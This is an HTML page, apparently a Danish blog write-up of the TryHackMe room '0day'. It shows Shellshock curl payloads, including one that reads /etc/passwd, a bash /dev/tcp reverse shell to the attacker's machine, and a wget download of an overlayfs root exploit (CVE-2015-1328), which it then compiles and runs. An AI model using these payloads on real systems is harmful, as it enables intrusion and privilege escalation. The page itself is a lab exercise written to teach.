@@ -1,0 +1,235 @@
+<!DOCTYPE html>
+<html lang="da">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Writeup af TryHackMe-rummet 0day med Shellshock, en bash reverse shell og en lokal privilege escalation via overlayfs (CVE-2015-1328).">
+<link rel="canonical" href="https://williamlarsen.dk/ctf/0day/">
+<meta property="og:title" content="0day — CTF-writeup | William Larsen">
+<meta property="og:description" content="Exploitation-opgave med Shellshock og privilege escalation via overlayfs.">
+<meta property="og:image" content="https://williamlarsen.dk/image.png">
+<meta property="og:image:width" content="2400">
+<meta property="og:image:height" content="1260">
+<meta property="og:image:alt" content="William Larsen — cybersikkerhed, udvikling og fotografi">
+<meta property="og:url" content="https://williamlarsen.dk/ctf/0day/">
+<meta property="og:type" content="article">
+<meta property="og:locale" content="da_DK">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="0day — CTF-writeup | William Larsen">
+<meta name="twitter:description" content="Exploitation-opgave med Shellshock og privilege escalation via overlayfs.">
+<meta name="twitter:image" content="https://williamlarsen.dk/image.png">
+<meta name="twitter:image:alt" content="William Larsen — cybersikkerhed, udvikling og fotografi">
+<meta name="theme-color" content="#8b6c4f">
+<title>0day — CTF-writeup | William Larsen</title>
+<link rel="icon" type="image/svg+xml" href="/favicon-20261021.svg">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Cormorant+Garamond:ital,wght@0,300;0,400;1,300&family=DM+Sans:wght@300;400;500&family=DM+Mono:wght@400;500&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="/projekter/case-20261021b.css">
+<link rel="stylesheet" href="/ctf/ctf.css">
+<link rel="stylesheet" href="/nav-20261021c.css">
+<script src="/nav-20261021.js" defer></script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "TechArticle",
+  "headline": "0day — CTF-writeup",
+  "description": "Exploitation-opgave med Shellshock og privilege escalation via overlayfs.",
+  "url": "https://williamlarsen.dk/ctf/0day/",
+  "inLanguage": "da-DK",
+  "author": { "@type": "Person", "name": "William Larsen", "url": "https://williamlarsen.dk/" },
+  "publisher": { "@type": "Person", "name": "William Larsen", "url": "https://williamlarsen.dk/" },
+  "about": ["Capture The Flag", "Shellshock", "CVE-2014-6271", "CVE-2015-1328", "Overlayfs"],
+  "isPartOf": { "@type": "CollectionPage", "name": "CTF & writeups", "url": "https://williamlarsen.dk/ctf/" }
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    { "@type": "ListItem", "position": 1, "name": "Forside", "item": "https://williamlarsen.dk/" },
+    { "@type": "ListItem", "position": 2, "name": "CTF & writeups", "item": "https://williamlarsen.dk/ctf/" },
+    { "@type": "ListItem", "position": 3, "name": "0day", "item": "https://williamlarsen.dk/ctf/0day/" }
+  ]
+}
+</script>
+</head>
+<body>
+<header class="wx-header">
+  <div class="wx-header-inner">
+    <a class="wx-logo" href="/">WX7</a>
+    <button class="wx-menu-btn" type="button" aria-expanded="false" aria-controls="wx-nav" aria-label="Åbn menu">
+      <span></span><span></span><span></span>
+    </button>
+    <nav class="wx-nav" id="wx-nav" aria-label="Primær navigation">
+      <a href="/">Forside</a>
+      <a href="/projekter/">Projekter</a>
+      <a href="/fotografi/">Fotografi</a>
+      <a href="/certifikater/">Certifikater</a>
+      <a href="/ctf/" class="is-active" aria-current="page">CTF</a>
+      <a href="https://lab.williamlarsen.dk/">Lab</a>
+    </nav>
+  </div>
+</header>
+<main class="wrap">
+  <nav class="breadcrumbs" aria-label="Brødkrumme">
+    <a href="/">Forside</a><span>/</span><a href="/ctf/">CTF</a><span>/</span><span>0day</span>
+  </nav>
+  <p class="eyebrow">TryHackMe · writeup</p>
+  <h1>0day</h1>
+  <p class="lead">En klassisk Shellshock-opgave med to lag: først en web-tjeneste der eksekverer kommandoer gennem CGI, derefter en gammel kernel der giver root. Undervejs var det ikke sårbarhederne, men de praktiske detaljer omkring dem, der tog tid.</p>
+  <div class="meta-row">
+    <span class="meta-chip live">Løst</span>
+    <span class="meta-chip">Exploitation / Privilege Escalation</span>
+    <span class="meta-chip">TryHackMe</span>
+    <span class="meta-chip">2026</span>
+  </div>
+  <div class="tech-tags">
+    <span>Shellshock</span>
+    <span>CVE-2014-6271</span>
+    <span>CVE-2015-1328</span>
+    <span>ffuf</span>
+    <span>Bash</span>
+    <span>GCC</span>
+    <span>Overlayfs</span>
+  </div>
+
+  <div class="writeup-note">Flags er fjernet fra denne offentlige version. IP-adresserne er fra et midlertidigt TryHackMe-lab og er uden værdi uden for sessionen, så de står som de var.</div>
+
+  <article class="writeup-body">
+    <h2>Opgaven</h2>
+    <blockquote>Root my secure Website, take a step into the history of hacking.</blockquote>
+    <p>Attacker-maskine: <code>10.112.75.160</code>. Target: <code>10.112.165.73</code>.</p>
+
+    <h2>1. Enumerering</h2>
+    <p>Jeg startede med at lede efter skjulte CGI-scripts i <code>/cgi-bin/</code> med ffuf:</p>
+<pre><code>ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt \
+  -u http://10.112.165.73/cgi-bin/FUZZ -fc 404 -e .cgi</code></pre>
+    <p>Et bevidst valg her var kun at filtrere <code>404</code> fra og ikke <code>403</code>. En 403 på et cgi-bin-script kan betyde, at scriptet faktisk findes, men ikke kan eksekveres eller kræver en anden metode. Filtrerer man begge koder væk, risikerer man at skjule netop det fund, man leder efter.</p>
+    <p>Scanningen pegede på et <code>test.cgi</code>, som blev udgangspunktet for resten af opgaven.</p>
+
+    <h2>2. Bekræftelse af Shellshock</h2>
+    <p>Sårbarheden er <code>CVE-2014-6271</code>. Bash fejlfortolker miljøvariabler, der starter med en funktionsdefinition som <code>() { :; };</code>, og alt efter semikolonet bliver eksekveret som shell-kommandoer. CGI-scripts sætter typisk request-headers som <code>User-Agent</code> som miljøvariabler, før bash kaldes, hvilket gør dem til et oplagt injektionspunkt.</p>
+<pre><code>curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" \
+  http://10.112.165.73/cgi-bin/test.cgi</code></pre>
+    <p>Kommandoen gav output fra <code>/etc/passwd</code>, og sårbarheden var dermed bekræftet.</p>
+
+    <h2>3. Reverse shell-payload</h2>
+    <p>Jeg byggede payloaden med bash's <code>/dev/tcp</code> og skrev IP-adressen med krøllede parenteser om:</p>
+<pre><code>curl -H "user-agent: () { :; }; /bin/bash -c 'bash -i &gt;&amp; /dev/tcp/{10.112.165.73}/8080 0&gt;&amp;1'" \
+  http://10.112.165.73/cgi-bin/test.cgi</code></pre>
+<pre><code>bash: {10.112.165.73}: Name or service not known
+bash: /dev/tcp/{10.112.165.73}/8080: Invalid argument</code></pre>
+    <p>Bash tolkede parenteserne som en del af adressen, så opslaget fejlede. Jeg skrev payloaden om uden parenteser og med min egen maskine som callback.</p>
+
+    <h2>4. Metasploit-forsøg (fravalgt spor)</h2>
+    <p>Sideløbende prøvede jeg et Metasploit-modul (<code>linux/http/advantech_switch_bash_env_exec</code>) som et alternativt spor til Shellshock-udnyttelsen:</p>
+<pre><code>msf exploit(linux/http/advantech_switch_bash_env_exec) &gt; set RHOST 10.112.165.73
+msf exploit(linux/http/advantech_switch_bash_env_exec) &gt; set LHOST 10.112.75.160</code></pre>
+<pre><code>[!] Unknown datastore option: LHOST. Did you mean VHOST?</code></pre>
+    <p>Modulets default payload brugte ikke <code>LHOST</code> (en bind shell eller en non-staged payload uden callback), så indstillingen fandtes ikke. Det er et godt eksempel på, at <code>show options</code> og <code>show payloads</code> skal læses, før man begynder at sætte variabler. Jeg droppede sporet og gik videre med den manuelle curl-baserede udnyttelse, da den passede bedre til target.</p>
+
+    <h2>5. Reverse shell på target</h2>
+    <p>Jeg satte en listener op på min egen maskine:</p>
+<pre><code>nc -lvp 8080</code></pre>
+    <p>Og sendte payloaden samlet, uden krøller, med min egen IP som mål for callback'et:</p>
+<pre><code>curl -H "user-agent: () { :; }; /bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.112.75.160/8080 0&gt;&amp;1'" \
+  http://10.112.165.73/cgi-bin/test.cgi</code></pre>
+    <p>Denne gang landede forbindelsen:</p>
+<pre><code>Connection received on ip-10-112-165-73.eu-central-1.compute.internal 39691
+bash: cannot set terminal process group (868): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@ubuntu:/usr/lib/cgi-bin$ whoami
+www-data</code></pre>
+    <p>Den rå netcat-shell havde ingen job control og ingen <code>TERM</code>-variabel, så jeg opgraderede den til en fuld TTY:</p>
+<pre><code>python3 -c 'import pty; pty.spawn("/bin/bash")'</code></pre>
+
+    <h2>6. User flag</h2>
+    <p>Flaget lå i <code>/home/ryan/user.txt</code> og er ikke gengivet her.</p>
+
+    <h2>7. Kernel- og versionsidentifikation</h2>
+<pre><code>uname -a</code></pre>
+<pre><code>Linux ubuntu 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64 GNU/Linux</code></pre>
+    <p>Kernel 3.13 er sårbar over for <code>CVE-2015-1328</code>, en privilege escalation-bug i Linux' <code>overlayfs</code>, hvor manglende tjek af brugerrettigheder ved fil-kopiering mellem lag giver en lokal bruger mulighed for at opnå root.</p>
+
+    <h2>8. Overførsel af exploit</h2>
+    <p>Jeg hentede exploit-koden med <code>searchsploit -m 37292</code> og serverede den fra min egen maskine. Første forsøg gav 404, fordi jeg startede serveren i en mappe, hvor filen ikke lå:</p>
+<pre><code>python3 -m http.server 80</code></pre>
+<pre><code>cd /tmp
+wget http://10.112.75.160/37292.c</code></pre>
+<pre><code>HTTP request sent, awaiting response... 404 File not found</code></pre>
+    <p>Det gentog sig et par gange, før det gik op for mig, at <code>http.server</code> kun serverer filer fra den mappe, den blev startet i. Jeg flyttede filen til den mappe, serveren stod i, og hentede den igen:</p>
+<pre><code>wget http://10.112.75.160/37292.c</code></pre>
+<pre><code>HTTP request sent, awaiting response... 200 OK
+Length: 4968 (4.9K) [text/plain]
+Saving to: '37292.c'</code></pre>
+
+    <h2>9. Manglende compiler-toolchain på target</h2>
+    <p>Første kompileringsforsøg fejlede, fordi gcc ikke kunne finde sin egen interne compiler:</p>
+<pre><code>gcc 37292.c</code></pre>
+<pre><code>gcc: error trying to exec 'cc1': execvp: No such file or directory</code></pre>
+    <p><code>$PATH</code> på target indeholdt ikke gcc's interne mappe med <code>cc1</code>:</p>
+<pre><code>echo $PATH
+/usr/local/bin:/usr/local/sbin:/usr/bin:/usr/sbin:/bin:/sbin:.</code></pre>
+    <p>Jeg lokaliserede den med <code>find</code> og pegede gcc derhen med <code>-B</code>:</p>
+<pre><code>find / -name "cc1" 2&gt;/dev/null</code></pre>
+<pre><code>/usr/lib/gcc/x86_64-linux-gnu/4.8/cc1</code></pre>
+<pre><code>gcc -B/usr/lib/gcc/x86_64-linux-gnu/4.8/ 37292.c -o exploit</code></pre>
+    <p>Det løste <code>cc1</code>, men afslørede et nyt problem: linkeren kunne heller ikke findes.</p>
+<pre><code>collect2: fatal error: cannot find 'ld'</code></pre>
+    <p>Jeg fandt flere varianter af <code>ld</code>, og <code>/usr/bin/ld</code> lå allerede i <code>$PATH</code> som en symlink til <code>ld.bfd</code>, der så intakt ud:</p>
+<pre><code>ls -la /usr/bin/ld
+file /usr/bin/ld</code></pre>
+<pre><code>lrwxrwxrwx 1 root root 6 Apr 25  2017 /usr/bin/ld -&gt; ld.bfd
+/usr/bin/ld: symbolic link to `ld.bfd'</code></pre>
+    <p><code>-B</code> alene løste det ikke konsekvent. I stedet for at pege enkeltstier ud satte jeg en samlet <code>$PATH</code>, der dækkede både de normale system-binaries og gcc's egen mappe, så både <code>cc1</code> og <code>ld</code> kunne findes af gcc og collect2 uden ekstra flag:</p>
+<pre><code>export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/lib/gcc/x86_64-linux-gnu/4.8</code></pre>
+<pre><code>gcc 37292.c -o exploit
+chmod +x exploit</code></pre>
+
+    <h2>10. Privilege escalation</h2>
+    <p>Exploiten udnytter overlayfs til at skrive en <code>/etc/ld.so.preload</code>-fil og derved injicere et shared library, der eksekveres med root-rettigheder:</p>
+<pre><code>./exploit</code></pre>
+<pre><code>spawning threads
+mount #1
+mount #2
+child threads done
+/etc/ld.so.preload created
+creating shared library
+# whoami
+root</code></pre>
+
+    <h2>11. Root flag</h2>
+    <p>Flaget lå i <code>/root/root.txt</code> og er ikke gengivet her.</p>
+
+    <h2>Hvad jeg lærte</h2>
+    <p>Den tekniske sårbarhed var ikke det svære. Shellshock og overlayfs-exploiten er begge veldokumenterede og offentligt tilgængelige. Det, der tog tid, var detaljerne omkring dem: en payload der skulle skrives om, en HTTP-server der stod i den forkerte mappe, og en compiler på target der manglede halvdelen af sin egen toolchain i <code>$PATH</code>.</p>
+    <p>Den vigtigste lærdom er derfor ikke selve exploit-kommandoerne, men at læse fejlbeskeder bogstaveligt og løse dem ét ad gangen. "no such file or directory" betyder præcis det, og <code>find</code> er den hurtigste vej til at afgøre, om noget mangler helt, eller bare ikke er i <code>$PATH</code>.</p>
+  </article>
+
+  <div class="writeup-footer">
+    <a href="/ctf/">← Alle CTF-writeups</a>
+    <span class="note">Flags er fjernet. IP-adresserne er fra et midlertidigt THM-lab.</span>
+  </div>
+</main>
+<footer class="site-footer">
+  <span>© 2026 William Larsen</span>
+  <div class="footer-links">
+    <a href="/projekter/">Projekter</a>
+    <a href="/fotografi/">Fotografi</a>
+    <a href="/certifikater/">Certifikater</a>
+    <a href="/ctf/">CTF</a>
+    <a href="https://lab.williamlarsen.dk/">Lab</a>
+    <a href="https://github.com/Williamxx7">GitHub</a>
+    <a href="https://linkedin.com/in/william-larsen-5b12002a0/">LinkedIn</a>
+  </div>
+</footer>
+<div class="pixel-chat">
+  <div class="pixel-chat-bubble" role="status">Stil spørgsmål om William</div>
+  <div data-pixel-william data-chat-trigger="true" data-scale="4"></div>
+</div>
+<script src="/pixel-william.js" defer></script>
+<script src="/widget.js" data-endpoint="https://william-chat.williamlarsen2005.workers.dev" data-contact="https://williamlarsen.dk/#kontakt" data-hide-button="true" data-pixel-trigger="true" defer></script>
+</body>
+</html>
